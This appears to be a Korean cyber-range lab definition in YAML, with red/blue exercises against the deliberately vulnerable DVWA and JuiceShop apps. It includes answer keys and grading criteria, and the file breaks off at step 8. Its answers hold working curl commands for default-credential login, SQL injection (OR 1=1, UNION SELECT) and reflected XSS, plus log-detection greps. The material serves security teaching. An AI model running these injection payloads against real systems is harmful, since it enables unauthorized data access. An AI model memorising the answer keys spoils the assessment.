lab_id: battle-ai-week03
title: 웹 애플리케이션 공격 — SQL Injection, XSS, 인증 우회 (AI 지원)
version: ai
course: battle-ai
week: 3
description: 1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. Red Phase에서 DVWA와 JuiceShop 대상 OWASP
  Top 10 공격을 수행하고, Blue Phase에서 공격 로그를 분석하고 탐지 규칙을 확인한다. AI SubAgent가 자동으로 명령을 실행하고
  결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- SQL Injection의 원리를 이해하고 수동으로 공격을 수행한다
- XSS와 인증 우회 공격을 실습한다
- Blue 관점에서 웹 공격을 탐지하고 분석한다
prerequisites:
- HTTP 프로토콜 기초
- SQL 기본 문법
infra_requirements:
- attacker VM (10.20.30.201)
- secu VM (10.20.30.1) — nftables, suricata
- web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem VM (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] DVWA 웹 애플리케이션(8080)에 접속하여 로그인하라. (admin/password)'
  hint: curl로 로그인 요청을 보낸다.
  category: exploit
  points: 5
  answer: "\U0001F916 프롬프트: [RED] DVWA 웹 애플리케이션(8080)에 접속하여 로그인하라. (admin/password)해줘\n\
    \U0001F4CE 참고 (CLI): curl -c /tmp/dvwa_cookies.txt \\\n     -d 'username=admin&password=password&Login=Login'\
    \ http://10.20.30.80:8080/login.php"
  answer_detail: DVWA의 기본 계정은 admin/password이다. curl -c 옵션으로 쿠키를 파일에 저장하면 이후 인증된 상태로
    요청을 보낼 수 있다.
  verify:
    type: file_exists
    expect: /tmp/dvwa_cookies.txt
    field: filesystem
    semantic:
      intent: '[RED] DVWA 로그인 — curl -c /tmp/dvwa_cookies.txt -d username=admin&password=password&Login=Login
        으로 POST /login.php. -c 옵션으로 PHPSESSID·security 쿠키를 파일 저장해 후속 요청에 -b 로 재사용.
        기본 계정 admin/password 악용'
      success_criteria:
      - curl -c /tmp/dvwa_cookies.txt + POST /login.php
      - username=admin&password=password 파라미터
      - 쿠키 파일 생성으로 세션 유지
      acceptable_methods:
      - curl -c cookie.txt -d ... /login.php
      - python requests.Session() 로 세션 유지
      - Burp Repeater + 쿠키 추출
      - selenium 자동 로그인
      negative_signs:
      - 쿠키 저장 없이 POST 만 (세션 소멸)
      - 기본 계정 (admin/password) 아닌 다른 자격 사용
      - login.php 아닌 다른 엔드포인트
  target_vm: attacker
  script: "curl -c /tmp/dvwa_cookies.txt \\\n     -d 'username=admin&password=password&Login=Login'\
    \ http://10.20.30.80:8080/login.php"
  risk_level: medium
  bastion_prompt: '[RED] DVWA 웹 애플리케이션(8080)에 접속하여 로그인하라. (admin/password)해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: '[RED] DVWA SQL Injection 페이지에서 '' OR ''1''=''1 입력으로 모든 사용자 정보를 추출하라.'
  hint: User ID 필드에 SQL 구문을 삽입한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] DVWA SQL Injection 페이지에서 '' OR ''1''=''1 입력으로 모든 사용자 정보를
    추출해줘

    📎 참고 (CLI): curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"'
  answer_detail: SQL Injection은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생한다. ' OR '1'='1 구문은 WHERE
    조건을 항상 참으로 만들어 모든 레코드를 반환하게 한다.
  verify:
    type: output_contains
    expect: First name
    field: stdout
    semantic:
      intent: '[RED] DVWA SQLi 기본 공격 — /vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271
        (URL 인코딩된 '' OR ''1''=''1) 페이로드로 WHERE 절 항상 참 → 모든 사용자 정보 반환. -b /tmp/dvwa_cookies.txt
        쿠키 재사용. First name/Surname 필드 다수 반환으로 성공 검증'
      success_criteria:
      - /vulnerabilities/sqli/ 엔드포인트 GET 요청
      - '%27+OR+%271%27%3D%271 또는 '' OR ''1''=''1 페이로드'
      - First name 또는 Surname 응답 (여러 사용자)
      acceptable_methods:
      - curl -b cookie.txt /vulnerabilities/sqli/?id=<payload>
      - ''' OR 1=1-- 주석 변형'
      - ''' OR ''a''=''a 논리 같음'
      - sqlmap -u <url> --cookie=... --data=id=1
      negative_signs:
      - 정상 ID 입력 (SQLi 페이로드 없음)
      - 쿠키 없이 미인증 요청 (보안 레벨 낮음 필요)
      - First name 없음 — SQLi 실패
  target_vm: attacker
  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"
  risk_level: medium
  bastion_prompt: '[RED] DVWA SQL Injection 페이지에서 '' OR ''1''=''1 입력으로 모든 사용자 정보를
    추출해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: '[RED] UNION SELECT를 사용하여 DVWA 데이터베이스의 테이블 이름을 추출하라.'
  hint: information_schema.tables를 활용한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] UNION SELECT를 사용하여 DVWA 데이터베이스의 테이블 이름을 추출해줘

    📎 참고 (CLI): curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit"'
  answer_detail: information_schema는 MySQL 메타데이터를 저장하는 시스템 데이터베이스이다. group_concat()으로
    여러 행을 하나의 문자열로 합쳐 추출한다.
  verify:
    type: output_contains
    expect: users
    field: stdout
    semantic:
      intent: '[RED] UNION SELECT + information_schema 기반 스키마 추출 — id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--
        로 현재 DB 의 테이블 목록 조회. information_schema(MySQL 메타DB) 와 group_concat() 행 병합
        기법. users 테이블 발견 → 후속 크리덴셜 추출 벡터'
      success_criteria:
      - UNION SELECT FROM information_schema.tables 페이로드
      - group_concat 또는 유사 행 병합 사용
      - users 또는 테이블 이름 응답에 포함
      acceptable_methods:
      - UNION SELECT ... FROM information_schema.tables
      - UNION ALL SELECT table_name FROM ...
      - sqlmap -u <url> --tables
      - Burp Intruder 로 컬럼 수 퍼징
      negative_signs:
      - 기본 OR 1=1 만 (UNION 없음)
      - information_schema 접근 없이 추측 테이블명
      - 응답에 테이블명 없음
  target_vm: attacker
  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2Cgroup_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit"
  risk_level: medium
  bastion_prompt: '[RED] UNION SELECT를 사용하여 DVWA 데이터베이스의 테이블 이름을 추출해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: '[RED] JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회하라.'
  hint: login API에 SQL Injection 페이로드를 전송한다.
  category: exploit
  points: 15
  answer: "\U0001F916 프롬프트: [RED] JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회해줘\n\
    \U0001F4CE 참고 (CLI): curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login\
    \ \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or\
    \ 1=1--\",\"password\":\"x\"}'"
  answer_detail: JuiceShop의 로그인 API는 email 필드에 SQL Injection이 가능하다. ' or 1=1-- 페이로드로
    인증을 우회하면 관리자 토큰을 획득한다.
  verify:
    type: output_contains
    expect: token
    field: stdout
    semantic:
      intent: '[RED] JuiceShop /rest/user/login SQLi 인증 우회 — POST JSON body {email:
        '' or 1=1--, password: x} 로 email 필드의 SQL 삽입 → WHERE 절 우회 → 첫 번째 사용자(관리자)
        인증 성공 → JWT token 반환. DVWA(MySQL + PHP) 와 달리 Node.js + SQLite 환경의 SQLi'
      success_criteria:
      - POST http://<web>:3000/rest/user/login JSON 요청
      - email 필드에 ' or 1=1-- 또는 동등한 페이로드
      - token 또는 authentication 응답 키 포함
      acceptable_methods:
      - curl -X POST + JSON body SQLi
      - 'python requests.post(url, json={email: payload})'
      - Burp Repeater 로 페이로드 변형
      - 'sqlmap --data=... --headers=Content-Type: application/json'
      negative_signs:
      - DVWA 엔드포인트 재사용 (JuiceShop 아님)
      - form-urlencoded 전송 (JSON 아님)
      - token 없음 — 우회 실패
  target_vm: attacker
  script: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n \
    \    -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"' or 1=1--\"\
    ,\"password\":\"x\"}'"
  risk_level: medium
  bastion_prompt: '[RED] JuiceShop(:3000)에 SQL Injection으로 관리자 인증을 우회해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: '[RED] DVWA Reflected XSS 페이지에서 스크립트 태그를 삽입하라.'
  hint: <script> 태그를 URL 인코딩하여 전송한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] DVWA Reflected XSS 페이지에서 스크립트 태그를 삽입해줘

    📎 참고 (CLI): curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"'
  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. <script>alert('XSS')</script>가
    HTML에 삽입되어 브라우저에서 실행된다.
  verify:
    type: output_contains
    expect: <script>
    field: stdout
    semantic:
      intent: '[RED] DVWA Reflected XSS — /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
        로 URL 인코딩된 <script>alert(''XSS'')</script> 반사. 사용자 입력 name 파라미터가 HTML 응답에
        그대로 삽입 → 브라우저에서 JS 실행. 응답에 <script> 태그 존재로 반사 검증 (Stored 아닌 Reflected)'
      success_criteria:
      - /vulnerabilities/xss_r/?name= + <script> 페이로드
      - 응답 HTML 에 <script> 태그 그대로 포함
      - Reflected vs Stored XSS 구분 인지
      acceptable_methods:
      - curl /vulnerabilities/xss_r/?name=<script>alert(1)</script>
      - <img src=x onerror=alert(1)> 대체 페이로드
      - XSStrike / dalfox 자동 퍼징
      - Burp Repeater + payload 리스트
      negative_signs:
      - Stored XSS 엔드포인트 사용 (xss_s)
      - 페이로드 URL 인코딩 안 함
      - 응답에 <script> 없음 — 필터링됨
  target_vm: attacker
  script: curl -b /tmp/dvwa_cookies.txt "http://10.20.30.80:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
  risk_level: medium
  bastion_prompt: '[RED] DVWA Reflected XSS 페이지에서 스크립트 태그를 삽입해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: '[BLUE] Suricata에서 SQL Injection 관련 알림을 확인하라.'
  hint: eve.json에서 SQL Injection 시그니처를 검색한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Suricata에서 SQL Injection 관련 알림을 확인해줘

    📎 참고 (CLI): tail -100 /var/log/suricata/eve.json | jq -r ''select(.event_type=="alert")
    | "\(.timestamp) \(.alert.signature) from \(.src_ip)"'' 2>/dev/null | grep -i
    sql | tail -5'
  answer_detail: Suricata의 ET Open 룰셋에는 SQL Injection 탐지 시그니처가 포함되어 있다. UNION SELECT,
    OR 1=1 등의 패턴이 탐지된다.
  verify:
    type: output_contains
    expect:
    - 10.20.30
    - Suricata
    - active
    - jq
    field: stdout
    semantic:
      intent: '[BLUE] Suricata eve.json SQL Injection 경보 조회 — tail /var/log/suricata/eve.json
        | jq select(.event_type==alert) | timestamp + alert.signature + src_ip 출력
        → grep -i sql 필터. ET Open SQL Injection 룰셋(UNION SELECT·OR 1=1·information_schema
        패턴) 트리거 검증'
      success_criteria:
      - jq 로 eve.json alert 필터 + .alert.signature 추출
      - grep -i sql 로 SQLi 관련 경보만 선별
      - timestamp + signature + src_ip 구조화 출력
      acceptable_methods:
      - jq + grep 파이프라인
      - suricata-update 로 ET Open 룰 갱신
      - Elastic Stack rule-based 질의
      - Wazuh 에도 Suricata 통합 이벤트 검색
      negative_signs:
      - fast.log 재조회 (eve.json JSON 파싱 아님)
      - SQL 필터 없이 전체 경보
      - src_ip/timestamp 없이 signature 만
  target_vm: secu
  script: tail -100 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert")
    | "\(.timestamp) \(.alert.signature) from \(.src_ip)"' 2>/dev/null | grep -i sql
    | tail -5
  risk_level: low
  bastion_prompt: '[BLUE] Suricata에서 SQL Injection 관련 알림을 확인해줘'
- order: 7
  instruction: '[BLUE] web 서버의 Apache access.log에서 SQL Injection 시도를 분석하라.


    [FIXTURE] /home/ccc/cyber-range/fixtures/battle-ai-week03/7/access.log 사전 주입.
    `grep -E ''sqli|xss|\.\./|admin'' /home/ccc/cyber-range/fixtures/battle-ai-week03/7/access.log`
    후 (1) 빈도·패턴 (2) MITRE (3) 방어 3섹션 분석. **raw dump 금지**.'
  hint: UNION, SELECT, OR 1=1 등의 패턴을 검색한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] web 서버의 Apache access.log에서 SQL Injection 시도를 분석해줘

    📎 참고 (CLI): grep -iE ''(union|select|or%201%3D1|%27)'' /var/log/apache2/access.log
    2>/dev/null | tail -10'
  answer_detail: Apache access.log에서 URL 인코딩된 SQL 키워드를 검색하면 SQL Injection 시도를 발견할
    수 있다. 공격 시각, 소스 IP, 대상 URL을 확인한다.
  verify:
    type: output_contains
    expect:
    - union
    - grep
    field: stdout
    semantic:
      intent: '[BLUE] Apache access.log SQLi 시도 패턴 grep — grep -iE (union|select|or%201%3D1|%27)
        로 URL 인코딩된 SQL 키워드(union/select/OR 1=1/'' 싱글쿼터) 검색. 공격 시각·src_ip·URL 확인해 SQLi
        시도 이력 분석. Apache 로그는 본문(POST body) 없고 GET 파라미터만 캡처'
      success_criteria:
      - grep -iE 로 (union|select|or 1=1|%27) 패턴 검색
      - access.log 대상 + union 키워드 포함 출력
      - URL 인코딩된 페이로드 인지 (%27 %3D 등)
      acceptable_methods:
      - grep -iE (union|select|or...|%27) access.log
      - awk 로 400+ 상태 행만 필터 + grep
      - goaccess 로 URL 빈도 + 수동 검토
      - ELK/Splunk 질의 search sourcetype=access_combined
      negative_signs:
      - grep 없이 전체 덤프
      - SQLi 키워드 패턴 부정확
      - Apache 로그 한계(본문 없음) 인지 못 함
  target_vm: web
  script: grep -iE '(union|select|or%201%3D1|%27)' /var/log/apache2/access.log 2>/dev/null
    | tail -10
  risk_level: low
  bastion_prompt: '[BLUE] web 서버의 Apache access.log에서 SQL Injection 시도를 분석해줘


    [FIXTURE] /home/ccc/cyber-range/fixtures/battle-ai-week03/7/access.log 사전 주입.
    `grep -E ''sqli|xss|\.\./|admin'' /home/ccc/cyber-range/fixtures/battle-ai-week03/7/access.log`
    후 (1)빈도·패턴 (2)MITRE (3)방어 3섹션. raw dump 금지.'
  fixtures:
  - generator: web_access
    target_vm: web
    path: /home/ccc/cyber-range/fixtures/battle-ai-week03/7/access.log
    params:
      seed: 42
      duration_days: 7
      scanner_bursts: 5
      sqli_attempts: 12
      xss_attempts: 8
    mode: overwrite
    cleanup: false
- order: 8
